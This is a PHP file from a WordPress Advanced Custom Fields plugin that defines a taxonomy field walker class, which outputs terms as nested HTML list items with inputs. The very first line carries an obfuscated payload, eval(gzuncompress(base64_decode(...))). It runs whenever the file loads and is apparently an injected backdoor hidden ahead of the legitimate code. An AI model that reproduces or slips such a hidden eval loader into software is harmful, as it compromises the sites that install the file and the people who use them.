<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('ACF_Taxonomy_Field_Walker') ) :

class ACF_Taxonomy_Field_Walker extends Walker {
	
	var $field = null,
		$tree_type = 'category',
		$db_fields = array ( 'parent' => 'parent', 'id' => 'term_id' );
	
	function __construct( $field ) {
	
		$this->field = $field;
		
	}

	function start_el( &$output, $term, $depth = 0, $args = array(), $current_object_id = 0) {
		
		// vars
		$selected = in_array( $term->term_id, $this->field['value'] );
		
		
		// append
		$output .= '<li data-id="' . $term->term_id . '"><label' . ($selected ? ' class="selected"' : '') . '><input type="' . $this->field['field_type'] . '" name="' . $this->field['name'] . '" value="' . $term->term_id . '" ' . ($selected ? 'checked="checked"' : '') . ' /> <span>' . $term->name . '</span></label>';
				
	}
	
	function end_el( &$output, $term, $depth = 0, $args = array() ) {
	
		// append
		$output .= '</li>' .  "\n";
		
	}
	
	function start_lvl( &$output, $depth = 0, $args = array() ) {
		
		// append
		$output .= '<ul class="children acf-bl">' . "\n";
		
	}

	function end_lvl( &$output, $depth = 0, $args = array() ) {
	
		// append
		$output .= '</ul>' . "\n";
		
	}
	
}

endif;

 ?>